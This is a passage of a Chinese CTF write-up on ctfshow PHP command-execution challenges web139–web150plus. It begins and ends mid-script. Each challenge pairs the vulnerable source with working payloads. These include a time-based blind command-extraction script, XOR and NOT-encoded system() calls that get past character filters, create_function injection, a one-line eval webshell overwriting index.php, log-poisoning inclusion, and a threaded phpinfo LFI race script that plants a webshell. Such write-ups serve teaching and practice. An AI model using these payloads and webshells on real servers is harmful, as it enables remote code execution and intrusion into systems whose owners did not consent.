sleep 3;fi\u0026#34;.format(i, j, n) #{n}是占位符 18 #print(payload) 19 url = \u0026#34;http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=\u0026#34; + payload 20 try: 21 requests.get(url, timeout=(2.5, 2.5)) #设置超时时间为 2.5 秒,包括连接超时和读取超时，超时就是之前sleep 3了。 22 23 # 如果请求发生异常，表示条件满足，将当前字符 n 添加到结果字符串中，并结束当前内层循环 24 except: 25 result = result + n 26 print(result) 27 break 28 if n == \u0026#39;~\u0026#39;: #str的最后一位，“~”不常出现，用作结尾 29 key = 1 30 31 # 在每次获取一个字符后，将一个空格添加到结果字符串中，用于分隔结果的不同位置 32 result += \u0026#34; \u0026#34; 这个脚本的原理其实就是，通过shell编程中的if语句判断\nls /|awk \u0026#39;NR=={0}\u0026#39;|cut -c {1} 中截取到的字符串是否与我们遍历的任一个字符匹配，若匹配成功则使用sleep命令使响应时间变为3s\n而脚本通过判断响应时间即可知道截取到的字符是否匹配，从而一个一个字符的获取\n读到flag的位置，接下来就是读文件了，原理一样\n1import requests 2import time 3import string 4 5str = string.digits+string.ascii_lowercase+\u0026#34;-\u0026#34;+\u0026#34;{\u0026#34;+\u0026#34;}\u0026#34; 6result = \u0026#34;\u0026#34; 7 8for i in range(1, 99): 9 key = 0 10 for j in range(1, 99): 11 if key == 1: 12 break 13 for n in str: 14 payload = \u0026#34;if [ `cat /f149_15_h3r3|awk \u0026#39;NR=={0}\u0026#39;|cut -c {1}` == {2} ];then sleep 3;fi\u0026#34;.format(i, j, n) 15 #print(payload) 16 url = \u0026#34;http://a37f8386-b265-4794-b4d1-7e4e62f05859.challenge.ctf.show//?c=\u0026#34; + payload 17 try: 18 requests.get(url, timeout=(2.5, 2.5)) 19 20\texcept: 21 result = result + n 22 print(result) 23 break 24 25 result += \u0026#34; \u0026#34; web140 函数的利用\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 12:39:25 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_POST[\u0026#39;f1\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;f2\u0026#39;])){ 15 $f1 = (String)$_POST[\u0026#39;f1\u0026#39;]; 16 $f2 = (String)$_POST[\u0026#39;f2\u0026#39;]; 17 if(preg_match(\u0026#39;/^[a-z0-9]+$/\u0026#39;, $f1)){ 18 if(preg_match(\u0026#39;/^[a-z0-9]+$/\u0026#39;, $f2)){ 19 $code = eval(\u0026#34;return $f1($f2());\u0026#34;); 20 if(intval($code) == \u0026#39;ctfshow\u0026#39;){ 21 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 22 } 23 } 24 } 25} 原文\n需要$f1($f2());的返回值，或者是字母开头的字符串，或者是空数组，或者就是0，或者FLASE。\npayload1： system(system())\u0026mdash;\u0026gt; f1=system\u0026amp;f2=system\nstring system( string $command[, int \u0026amp;$return_var] )：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system(\u0026lsquo;FLASE\u0026rsquo;)，空指令，失败返回FLASE。\npayload2： usleep(usleep())\u0026mdash;\u0026gt; f1=usleep\u0026amp;f2=usleep usleep没有返回值。 所以intval参数为空，失败返回0\npayload3： getdate(getdate())\u0026mdash;\u0026gt; f1=getdate\u0026amp;f2=getdate\narray getdate([ int $timestamp = time()] )：返回结果是array，参数必须是int型。所以getdate(getdate())\u0026mdash;-\u0026gt;getdate(array型)\u0026mdash;\u0026gt;失败返回flase，intval为0。\nweb141 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 19:28:09 9 10*/ 11 12#error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 17 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 18 19 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 20 if(preg_match(\u0026#39;/^\\W+$/\u0026#39;, $v3)){ 21 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 22 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 23 } 24 } 25} preg_match(\u0026#39;/^\\W+$/\u0026#39;, $v3) 此正则表达式用于检查字符串 $v3 是否完全由非单词字符组成，且不能为空。（单词字符：字母、数字和下划线）\n根据题目我们可以联想到取反，或，异或命令执行，这里随便一个都行\nphp中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1=1\u0026amp;v2=1\u0026amp;v3=-phpinfo()-\n羽师傅有个取反脚本\n1\u0026lt;?php 2//在命令行中运行 3 4/*author yu22x*/ 5 6fwrite(STDOUT,\u0026#39;[+]your function: \u0026#39;); 7 8$system=str_replace(array(\u0026#34;\\r\\n\u0026#34;, \u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;), \u0026#34;\u0026#34;, fgets(STDIN)); 9 10fwrite(STDOUT,\u0026#39;[+]your command: \u0026#39;); 11 12$command=str_replace(array(\u0026#34;\\r\\n\u0026#34;, \u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;), \u0026#34;\u0026#34;, fgets(STDIN)); 13 14echo \u0026#39;[*] (~\u0026#39;.urlencode(~$system).\u0026#39;)(~\u0026#39;.urlencode(~$command).\u0026#39;);\u0026#39;; 直接用就行\npayload:\n?v1=1\u0026amp;v2=1\u0026amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)- web142 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 19:36:02 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 if(is_numeric($v1)){ 17 $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); 18 sleep($d); 19 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 20 } 21} 这题就是一个$d秒后出flag，直接传入v1=0，直接拿到flag\npayload:\n?v1=0 web143 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 12:48:14 9 10*/ 11 12highlight_file(__FILE__); 13if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 14 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 15 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 16 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 17 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 18 if(preg_match(\u0026#39;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\\u0026amp;|\\;/i\u0026#39;, $v3)){ 19 die(\u0026#39;get out hacker!\u0026#39;); 20 } 21 else{ 22 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 23 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 24 } 25 } 26} 这题ban掉了取反，只能用其他位运算符构造payload\n羽师傅的异或脚本\n1\u0026lt;?php 2 3/*author yu22x*/ 4 5$myfile = fopen(\u0026#34;xor_rce.txt\u0026#34;, \u0026#34;w\u0026#34;); 6$contents=\u0026#34;\u0026#34;; 7for ($i=0; $i \u0026lt; 256; $i++) { 8\tfor ($j=0; $j \u0026lt;256 ; $j++) { 9 10\tif($i\u0026lt;16){ 11\t$hex_i=\u0026#39;0\u0026#39;.dechex($i); 12\t} 13\telse{ 14\t$hex_i=dechex($i); 15\t} 16\tif($j\u0026lt;16){ 17\t$hex_j=\u0026#39;0\u0026#39;.dechex($j); 18\t} 19\telse{ 20\t$hex_j=dechex($j); 21\t} 22\t$preg = \u0026#39;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\\u0026amp;|\\;/i\u0026#39;; //根据题目给的正则表达式修改即可 23\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 24\techo \u0026#34;\u0026#34;; 25 } 26 27\telse{ 28\t$a=\u0026#39;%\u0026#39;.$hex_i; 29\t$b=\u0026#39;%\u0026#39;.$hex_j; 30\t$c=(urldecode($a)^urldecode($b)); 31\tif (ord($c)\u0026gt;=32\u0026amp;ord($c)\u0026lt;=126) { 32\t$contents=$contents.$c.\u0026#34; \u0026#34;.$a.\u0026#34; \u0026#34;.$b.\u0026#34;\\n\u0026#34;; 33\t} 34\t} 35 36} 37} 38fwrite($myfile,$contents); 39fclose($myfile); 1# -*- coding: utf-8 -*- 2 3# author yu22x 4 5import requests 6import urllib 7from sys import * 8import os 9def action(arg): 10 s1=\u0026#34;\u0026#34; 11 s2=\u0026#34;\u0026#34; 12 for i in arg: 13 f=open(\u0026#34;xor_rce.txt\u0026#34;,\u0026#34;r\u0026#34;) 14 while True: 15 t=f.readline() 16 if t==\u0026#34;\u0026#34;: 17 break 18 if t[0]==i: 19 #print(i) 20 s1+=t[2:5] 21 s2+=t[6:9] 22 break 23 f.close() 24 output=\u0026#34;(\\\u0026#34;\u0026#34;+s1+\u0026#34;\\\u0026#34;^\\\u0026#34;\u0026#34;+s2+\u0026#34;\\\u0026#34;)\u0026#34; 25 return(output) 26 27while True: 28 param=action(input(\u0026#34;\\n[+] your function：\u0026#34;) )+action(input(\u0026#34;[+] your command：\u0026#34;))+\u0026#34;;\u0026#34; 29 print(param) web144 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 16:21:15 9 10*/ 11 12highlight_file(__FILE__); 13if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 14 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 15 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 16 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 17 18 if(is_numeric($v1) \u0026amp;\u0026amp; check($v3)){ 19 if(preg_match(\u0026#39;/^\\W+$/\u0026#39;, $v2)){ 20 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 21 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 22 } 23 } 24} 25 26function check($str){ 27 return strlen($str)===1?true:false; 28} 这题跟143差不多，只是参数交换了一下位置\n直接异或出了\n?v1=1\u0026amp;v2=-(\u0026#34;%0c%06%0c%0b%05%0d\u0026#34;^\u0026#34;%7f%7f%7f%7f%60%60\u0026#34;)(\u0026#34;%03%01%0b%00%06%00\u0026#34;^\u0026#34;%60%60%7f%20%60%2a\u0026#34;)\u0026amp;v3=1 web145 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 17:41:33 9 10*/ 11 12 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 17 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 18 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 19 if(preg_match(\u0026#39;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\\u0026amp;|\\;|\\\u0026lt;|\\\u0026gt;|\\*|\\/|\\^|\\#|\\\u0026#34;/i\u0026#39;, $v3)){ 20 die(\u0026#39;get out hacker!\u0026#39;); 21 } 22 else{ 23 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 24 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 25 } 26 } 27} 这题ban掉了异或运算符^,同时也ban掉了加减乘除\n但是我们还可以考虑构造三目运算符配合取反\npayload:\n/?v1=1\u0026amp;v2=1\u0026amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5): web146 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 17:41:33 9 10*/ 11 12 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 17 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 18 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 19 if(preg_match(\u0026#39;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\\u0026amp;|\\;|\\\u0026lt;|\\\u0026gt;|\\*|\\/|\\^|\\#|\\\u0026#34;/i\u0026#39;, $v3)){ 20 die(\u0026#39;get out hacker!\u0026#39;); 21 } 22 else{ 23 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 24 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 25 } 26 } 27} 这题把三目运算符也ban了\n可以考虑使用位运算符|\npayload:\n?v1=1\u0026amp;v2=1\u0026amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)| web147 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 02:04:38 9 10*/ 11 12 13 14highlight_file(__FILE__); 15 16if(isset($_POST[\u0026#39;ctf\u0026#39;])){ 17 $ctfshow = $_POST[\u0026#39;ctf\u0026#39;]; 18 if(!preg_match(\u0026#39;/^[a-z0-9_]*$/isD\u0026#39;,$ctfshow)) { 19 $ctfshow(\u0026#39;\u0026#39;,$_GET[\u0026#39;show\u0026#39;]); 20 } 21 22} create_function()代码注入\n如果我们第二个参数传入 echo 1;}phpinfo();// 就等价于\nfunction f($a) {\recho 1;}phpinfo();//\r}\r从而执行phpinfo()命令 那要怎么绕过正则表达式呢\n/^[a-z0-9_]*$/isD 这个正则表达式匹配所有的字母数字和下划线\n而且由于\nphp里默认命名空间是\\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果写\\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法\n所以我们可以通过\\create_function()来绕过这个正则表达式\npayload:\nGET show=;};system(\u0026#39;cat f*\u0026#39;);/*\rPOST ctf=\\create_function web148 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 03:52:11 9 10*/ 11 12 13 14include \u0026#39;flag.php\u0026#39;; 15if(isset($_GET[\u0026#39;code\u0026#39;])){ 16 $code=$_GET[\u0026#39;code\u0026#39;]; 17 if(preg_match(\u0026#34;/[A-Za-z0-9_\\%\\\\|\\~\\\u0026#39;\\,\\.\\:\\@\\\u0026amp;\\*\\+\\- ]+/\u0026#34;,$code)){ 18 die(\u0026#34;error\u0026#34;); 19 } 20 @eval($code); 21} 22else{ 23 highlight_file(__FILE__); 24} 25 26function get_ctfshow_fl0g(){ 27 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 28} 没ban异或运算符\npayload:\n(\u0026#34;%08%02%08%09%05%0d\u0026#34;^\u0026#34;%7b%7b%7b%7d%60%60\u0026#34;)(\u0026#34;%03%01%09%01%06%02\u0026#34;^\u0026#34;%60%60%7d%21%60%28\u0026#34;);\r//system(\u0026#34;cat f*\u0026#34;); web149 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 04:34:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15 16$files = scandir(\u0026#39;./\u0026#39;); 17foreach($files as $file) { 18 if(is_file($file)){ 19 if ($file !== \u0026#34;index.php\u0026#34;) { 20 unlink($file); 21 } 22 } 23} 24 25file_put_contents($_GET[\u0026#39;ctf\u0026#39;], $_POST[\u0026#39;show\u0026#39;]); 26 27$files = scandir(\u0026#39;./\u0026#39;); 28foreach($files as $file) { 29 if(is_file($file)){ 30 if ($file !== \u0026#34;index.php\u0026#34;) { 31 unlink($file); 32 } 33 } 34} 直接用一句话木马覆写掉index.php\nGET ?ctf=index.php\rPOST show=\u0026lt;?php @eval($_POST[\u0026#39;1\u0026#39;]);?\u0026gt; 写入后\nPOST 1=system(\u0026#39;cat /ctfshow_fl0g_here.txt\u0026#39;); web150 非预期 日志注入\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 07:12:57 9 10*/ 11include(\u0026#34;flag.php\u0026#34;); 12error_reporting(0); 13highlight_file(__FILE__); 14 15class CTFSHOW{ 16 private $username; 17 private $password; 18 private $vip; 19 private $secret; 20 21 function __construct(){ 22 $this-\u0026gt;vip = 0; 23 $this-\u0026gt;secret = $flag; 24 } 25 26 function __destruct(){ 27 echo $this-\u0026gt;secret; 28 } 29 30 public function isVIP(){ 31 return $this-\u0026gt;vip?TRUE:FALSE; 32 } 33 } 34 35 function __autoload($class){ 36 if(isset($class)){ 37 $class(); 38 } 39} 40 41#过滤字符 42$key = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 43if(preg_match(\u0026#39;/\\_| |\\[|\\]|\\?/\u0026#39;, $key)){ 44 die(\u0026#34;error\u0026#34;); 45} 46$ctf = $_POST[\u0026#39;ctf\u0026#39;]; 47extract($_GET); 48if(class_exists($__CTFSHOW__)){ 49 echo \u0026#34;class is exists!\u0026#34;; 50} 51 52if($isVIP \u0026amp;\u0026amp; strrpos($ctf, \u0026#34;:\u0026#34;)===FALSE){ 53 include($ctf); 54} 这题存在非预期，可以通过extract变量覆盖使isVIP=true，接着进行日志注入\n或者\n把马写到日志里\npayload:\nGET ?isVIP=true\u0026amp;1=system(\u0026#39;cat f*\u0026#39;);\rPOST ctf=/var/log/nginx/access.log web150plus 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 07:12:57 9 10*/ 11include(\u0026#34;flag.php\u0026#34;); 12error_reporting(0); 13highlight_file(__FILE__); 14 15class CTFSHOW{ 16 private $username; 17 private $password; 18 private $vip; 19 private $secret; 20 21 function __construct(){ 22 $this-\u0026gt;vip = 0; 23 $this-\u0026gt;secret = $flag; 24 } 25 26 function __destruct(){ 27 echo $this-\u0026gt;secret; 28 } 29 30 public function isVIP(){ 31 return $this-\u0026gt;vip?TRUE:FALSE; 32 } 33 } 34 35 function __autoload($class){ 36 if(isset($class)){ 37 $class(); 38 } 39} 40 41#过滤字符 42$key = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 43if(preg_match(\u0026#39;/\\_| |\\[|\\]|\\?/\u0026#39;, $key)){ 44 die(\u0026#34;error\u0026#34;); 45} 46$ctf = $_POST[\u0026#39;ctf\u0026#39;]; 47extract($_GET); 48if(class_exists($__CTFSHOW__)){ 49 echo \u0026#34;class is exists!\u0026#34;; 50} 51 52if($isVIP \u0026amp;\u0026amp; strrpos($ctf, \u0026#34;:\u0026#34;)===FALSE \u0026amp;\u0026amp; strrpos($ctf,\u0026#34;log\u0026#34;)===FALSE){ 53 include($ctf); 54} 这题ban掉了非预期解 日志注入的方法\n首先我们需要知道__autoload方法的作用\n__autoload()：自动加载函数，当使用未定义的类时会自动调用该函数。如果$class变量已设置，则将其作为函数调用。 而且这题的__autoload并不在类CTFSHOW中（障眼法）\n这个类在isVIP后面已经结束了\n所以我们可以通过\nif(class_exists($__CTFSHOW__)){\recho \u0026#34;class is exists!\u0026#34;;\r} 调用任意的类\n我们可以根据php会将.解析成_的特性绕过正则\nGET ?..CTFSHOW..=phpinfo 由于原题需要竞争所以后面就直接把flag放环境变量了\n这里我们直接在phpinfo里面找就行\n原题解法 拿到phpinfo我们就可以getshell了\nPHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。假如在服务器上找不到我们可以包含的文件，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件了。如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。 原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902\n过程 1.发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据\n2.phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大\n3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接\n4.操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包\n5.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除\n6.利用这个时间差，发第二个数据包，即可成功包含临时文件，最终getshell\n处理 PHP 对 enctype=\u0026ldquo;multipart/form-data\u0026quot;请求的处理过程如下： 1、请求到达； 2、创建临时文件（通常是/tmp/php[6 个随机字符]），并写入上传文件的内容； 3、调用相应 PHP 脚本进行处理，如校验名称、大小等； 4、删除临时文件。 总结 php post 上传文件产生临时文件，phpinfo读临时文件的路径和名字，本地包含后生成后门 原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902\n大佬的脚本，但是是python2的\n1#!/usr/bin/python 2import sys 3import threading 4import socket 5 6def setup(host, port): 7 TAG=\u0026#34;Security Test\u0026#34; 8 PAYLOAD=\u0026#34;\u0026#34;\u0026#34;%s\\r 9\u0026lt;?php file_put_contents(\u0026#39;/tmp/g\u0026#39;, \u0026#39;\u0026lt;?=eval($_REQUEST[1])?\u0026gt;\u0026#39;)?\u0026gt;\\r\u0026#34;\u0026#34;\u0026#34; % TAG 10 REQ1_DATA=\u0026#34;\u0026#34;\u0026#34;-----------------------------7dbff1ded0714\\r 11Content-Disposition: form-data; name=\u0026#34;dummyname\u0026#34;; filename=\u0026#34;test.txt\u0026#34;\\r 12Content-Type: text/plain\\r 13\\r 14%s 15-----------------------------7dbff1ded0714--\\r\u0026#34;\u0026#34;\u0026#34; % PAYLOAD 16 padding=\u0026#34;A\u0026#34; * 5000 17 REQ1=\u0026#34;\u0026#34;\u0026#34;POST /06/phpinfo.php?a=\u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34; HTTP/1.1\\r 18Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 19HTTP_ACCEPT: \u0026#34;\u0026#34;\u0026#34; + padding + \u0026#34;\u0026#34;\u0026#34;\\r 20HTTP_USER_AGENT: \u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 21HTTP_ACCEPT_LANGUAGE: \u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 22HTTP_PRAGMA: \u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 23Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r 24Content-Length: %s\\r 25Host: %s\\r 26\\r 27%s\u0026#34;\u0026#34;\u0026#34; %(len(REQ1_DATA),host,REQ1_DATA) 28 #modify this to suit the LFI script 29 LFIREQ=\u0026#34;\u0026#34;\u0026#34;GET /06/lfi.php?file=%s HTTP/1.1\\r 30User-Agent: Mozilla/4.0\\r 31Proxy-Connection: Keep-Alive\\r 32Host: %s\\r 33\\r 34\\r 35\u0026#34;\u0026#34;\u0026#34; 36 return (REQ1, TAG, LFIREQ) 37 38def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): 39 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 40 s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 41 42 s.connect((host, port)) 43 s2.connect((host, port)) 44 45 s.send(phpinforeq) 46 d = \u0026#34;\u0026#34; 47 while len(d) \u0026lt; offset: 48 d += s.recv(offset) 49 try: 50 i = d.index(\u0026#34;[tmp_name] =\u0026amp;gt; \u0026#34;) 51 fn = d[i+17:i+31] 52 except ValueError: 53 return None 54 55 s2.send(lfireq % (fn, host)) 56 d = s2.recv(4096) 57 s.close() 58 s2.close() 59 60 if d.find(tag) != -1: 61 return fn 62 63counter=0 64class ThreadWorker(threading.Thread): 65 def __init__(self, e, l, m, *args): 66 threading.Thread.__init__(self) 67 self.event = e 68 self.lock = l 69 self.maxattempts = m 70 self.args = args 71 72 def run(self): 73 global counter 74 while not self.event.is_set(): 75 with self.lock: 76 if counter \u0026gt;= self.maxattempts: 77 return 78 counter+=1 79 80 try: 81 x = phpInfoLFI(*self.args) 82 if self.event.is_set(): 83 break 84 if x: 85 print \u0026#34;\\nGot it! Shell created in /tmp/g\u0026#34; 86 self.event.set() 87 88 except socket.error: 89 return 90 91 92def getOffset(host, port, phpinforeq): 93 \u0026#34;\u0026#34;\u0026#34;Gets offset of tmp_name in the php output\u0026#34;\u0026#34;\u0026#34; 94 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 95 s.connect((host,port)) 96 s.send(phpinforeq) 97 98 d = \u0026#34;\u0026#34; 99 while True: 100 i = s.recv(4096) 101 d+=i 102 if i == \u0026#34;\u0026#34;: 103 break 104 # detect the final chunk 105 if i.endswith(\u0026#34;0\\r\\n\\r\\n\u0026#34;): 106 break 107 s.close() 108 i = d.find(\u0026#34;[tmp_name] =\u0026amp;gt; \u0026#34;) 109 if i == -1: 110 raise ValueError(\u0026#34;No php tmp_name in phpinfo output\u0026#34;) 111 112 print \u0026#34;found %s at %i\u0026#34; % (d[i:i+10],i) 113 # padded up a bit 114 return i+256 115 116def main(): 117 118 print \u0026#34;LFI With PHPInfo()\u0026#34; 119 print \u0026#34;-=\u0026#34; * 30 120 121 if len(sys.argv) \u0026lt; 2: 122 print \u0026#34;Usage: %s host [port] [threads]\u0026#34; % sys.argv[0] 123 sys.exit(1) 124 125 try: 126 host = socket.gethostbyname(sys.argv[1]) 127 except socket.error, e: 128 print \u0026#34;Error with hostname %s: %s\u0026#34; % (sys.argv[1], e) 129 sys.exit(1) 130 131 port=80 132 try: 133 port = int(sys.argv[2]) 134 except IndexError: 135 pass 136 except ValueError, e: 137 print \u0026#34;Error with port %d: %s\u0026#34; % (sys.argv[2], e) 138 sys.exit(1) 139 140 poolsz=10 141 try: 142 poolsz = int(sys.argv[3]) 143 except IndexError: 144 pass 145 except ValueError, e: 146 print \u0026#34;Error with poolsz %d: %s\u0026#34; % (sys.argv[3], e) 147 sys.exit(1) 148 149 print \u0026#34;Getting initial offset...\u0026#34;, 150 reqphp, tag, reqlfi = setup(host, port) 151 offset = getOffset(host, port, reqphp) 152 sys.stdout.flush() 153 154 maxattempts = 1000 155 e = threading.Event() 156 l = threading.Lock() 157 158 print \u0026#34;Spawning worker pool (%d)...\u0026#34; % poolsz 159 sys.stdout.flush() 160 161 tp = [] 162 for i in range(0,poolsz): 163 tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) 164 165 for t in tp: 166 t.start() 167 try: 168 while not e.wait(1): 169 if e.is_set(): 170 break 171 with l: 172 sys.stdout.write( \u0026#34;\\r% 4d / % 4d\u0026#34; % (counter, maxattempts)) 173 sys.stdout.flush() 174 if counter \u0026gt;= maxattempts: 175 break 176 print 177 if e.is_set(): 178 print \u0026#34;Woot! \\m/\u0026#34; 179 else: 180 print \u0026#34;:(\u0026#34; 181 except KeyboardInterrupt: 182 print \u0026#34;\\nTelling threads to shutdown...\u0026#34; 183 e.set() 184 185 print \u0026#34;Shuttin\u0026#39; down...\u0026#34; 186 for t in tp: 187 t.join() 188 189if 